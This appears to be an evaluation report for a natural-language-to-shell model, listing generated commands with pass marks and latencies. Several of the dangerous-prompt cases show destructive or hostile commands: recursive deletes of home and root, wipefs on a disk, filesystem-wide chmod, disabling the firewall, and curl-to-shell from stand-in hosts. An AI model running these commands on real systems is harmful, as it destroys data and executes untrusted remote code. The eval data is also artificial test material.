# eval: llama-server / nl2sh-qwen35-q4_k_m.gguf (nl2sh-qwen35-2b)
- mode: plain · dataset core.jsonl#83828218eadbc7f7 · repeat 1
- pass: 38/72 (53%)
- cold p50 484ms p95 1215ms · warm p50 0ms p95 0ms

| case | pass | cold ms | warm ms | commands |
| --- | --- | --- | --- | --- |
| u01 | ✗ | 1144 | - | uname -r | grep -o '[A-Za-z0-9]\+' | head -n1 | xargs -I {} echo "node {}" |
| u02 | ✓ | 191 | - | ls -lS |
| u03 | ✓ | 438 | - | curl -s https://api.ipify.org |
| u04 | ✗ | 354 | - | fuser -v 3000 |
| u05 | ✓ | 351 | - | du -sh . |
| u06 | ✗ | 1088 | - | find / -mtime -1 -name '*.log' -print0 | xargs -0 -n1 echo "find all .log files  |
| u07 | ✓ | 459 | - | ps -ef | grep node | grep -v grep |
| u08 | ✗ | 848 | - | zsh -c "git status; echo 'branch: $(git branch --show-current)" |
| u09 | ✗ | 464 | - | zsh -c "install ripgrep" |
| u10 | ✓ | 317 | - | mkdir -p projects && cd projects |
| u11 | ✓ | 563 | - | tar -czf archive.tar.gz $(ls -d */) |
| u12 | ✓ | 276 | - | env | grep PATH |
| u13 | ✗ | 984 | - | kill $(netstat -t -n -p 8080 | awk '{print $2}' | head -n1) |
| u14 | ✓ | 497 | - | tail -n 20 /var/log/syslog |
| u15 | ✓ | 362 | - | which python3 |
| u16 | ✓ | 216 | - | brew update --all |
| u17 | ✗ | 497 | - | ls -l $(which zsh) $(which bash) |
| u18 | ✗ | 356 | - | git undo HEAD~1 |
| u19 | ✓ | 459 | - | du -ah ~/ | sort -nr | head -n 5 |
| u20 | ✓ | 147 | - | free -h |
| u21 | ✗ | 514 | - | wc -l $(find . -name '*.js' -print) |
| u22 | ✗ | 185 | - | docker service restart |
| u23 | ✓ | 523 | - | chmod +x script.sh && zsh script.sh |
| u24 | ✓ | 547 | - | find / -type f -exec grep -l TODO {} \; |
| u25 | ✓ | 486 | - | curl -O https://example.com/file.zip -o ~/downloads |
| u26 | ✗ | 1092 | - | uname -a | grep -o '.*:.*' | head -n 1 | xargs -I {} echo {} | sh |
| u27 | ✗ | 551 | - | echo "add export FOO=bar to my zshrc" | zsh -s |
| u28 | ✓ | 679 | - | find . -name node_modules -exec rm -rf {} \; |
| u29 | ✗ | 191 | - | ss -t |
| u30 | ✗ | 403 | - | zcat file.zip | tar -xzf - |
| u31 | ✗ | 419 | - | tail -f /var/log/syslog | zsh |
| u32 | ✗ | 366 | - | uptime | zsh |
| u33 | ✗ | 777 | - | find / -name "*.sh" -exec grep -l "zsh" {} \; |
| u34 | ✗ | 1392 | - | cat $(shuf -n 1 <(echo -e "echo 'show DNS servers\n(Platform: unix, shell: zsh)\ |
| u35 | ✓ | 261 | - | cp file.txt backup.txt |
| u36 | ✓ | 395 | - | mv old.txt new.txt |
| u37 | ✓ | 243 | - | du -sh ~/Downloads |
| u38 | ✗ | 199 | - | npm global ls |
| u39 | ✗ | 590 | - | open -P zsh $(pwd) |
| u40 | ✗ | 156 | - | flushdns |
| a01 | ✓ | 246 | - | rm -rf ~/ |
| a02 | ✓ | 493 | - | sudo wipefs --all /dev/sdX /bin/sh |
| a03 | ✗ | 388 | - | git push -f |
| a04 | ✗ | 630 | - | curl -s https://sketchy.example.com/install.sh | zsh -s |
| a05 | ✗ | 484 | - | pkill -9 `uname -i` |
| a06 | ✓ | 466 | - | chmod 777 $(find / -type f) |
| a07 | ✗ | 757 | - | watch -d bash -c "echo 'make this command run every time I open a terminal'" |
| a08 | ✓ | 618 | - | curl -sL https://x.io/i | sh -s -- -p zsh |
| a09 | ✓ | 449 | - | chmod -R 755 / |
| a10 | ✓ | 701 | - | find /var/log -type f -mtime +30 -exec rm {} \; |
| a11 | ✗ | 735 | - | echo "systemd-run --now=now zsh -c 'touch /tmp/now' &" |
| a12 | ✓ | 522 | - | git reset --hard $(date +%s) |
| a13 | ✓ | 1215 | - | sudo rm -rf /usr/local/bin/node /usr/share/dotfiles/node /usr/local/lib/node_mod |
| a14 | ✓ | 251 | - | ufw disable |
| a15 | ✓ | 476 | - | find /tmp -type f -exec rm -f {} \; |
| a16 | ✓ | 548 | - | find / -type f -exec rm -f {} \; |
| a17 | ✓ | 207 | - | rm -rf ~/ |
| a18 | ✓ | 2184 | - | echo "zsh -c 'echo $(echo $(echo $(echo $(echo $(echo $(echo $(echo $(echo $(ech |
| a19 | ✗ | 952 | - | echo "PATH=$(echo $HOME/.config/zsh/env | tr -d '\n' | sed 's/=/=/g')" |
| a20 | ✓ | 435 | - | zsh -c "rm -rf / --no-preserve-root" |
| u41 | ✗ | 601 | - | find ~ -size +100M -print0 | xargs -0 rm -rf |
| u42 | ✓ | 554 | - | touch $(echo -n 'my notes.txt\nhello world') |
| u43 | ✓ | 246 | - | git log -n 5 |
| u44 | ✓ | 359 | - | curl -s https://example.com | zcat |
| u45 | ✗ | 455 | - | find /home/user -type f | wc -l |
| u46 | ✗ | 1569 | - | ping -c 1 127.0.0.1 | grep -o -E '[0-9]+[.][0-9]+[.][0-9]+[.][0-9]+[.][0-9]+' |
| u47 | ✗ | 1046 | - | df -a | grep -v '^$' | grep -v '^total$' | awk '{print "sudo df -h "$1}' | sh |
| u48 | ✗ | 669 | - | who -l | zsh -c 'echo "who is logged in"' |
| a21 | ✗ | 655 | - | echo "crontab -l | sed 's/^/echo \"/' | sh" |
| a22 | ✓ | 513 | - | ln -s ~/somefile /etc/hosts |
| a23 | ✓ | 473 | - | find . -type f -exec rm {} \; |
| a24 | ✗ | 325 | - | curl https://x.io/i.sh | bash |
